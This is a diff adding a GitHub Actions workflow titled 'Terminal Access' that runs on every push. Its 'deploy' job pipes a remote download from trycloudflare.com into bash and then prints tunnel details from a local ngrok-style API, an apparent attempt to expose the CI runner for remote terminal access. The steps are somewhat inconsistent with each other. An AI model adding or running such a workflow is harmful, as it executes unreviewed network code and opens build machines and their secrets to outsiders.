@@ -1,0 +1,16 @@
+name: Terminal Access
+
+on: [push]
+
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Start Web Terminal
+      run: |
+        sudo apt update
+        sudo apt install -y tmux net-tools
+        curl -fsSL https://trycloudflare.com | bash &
+        sleep 5
+        curl http://localhost:4040/api/tunnels > tunnels.json
+        cat tunnels.json
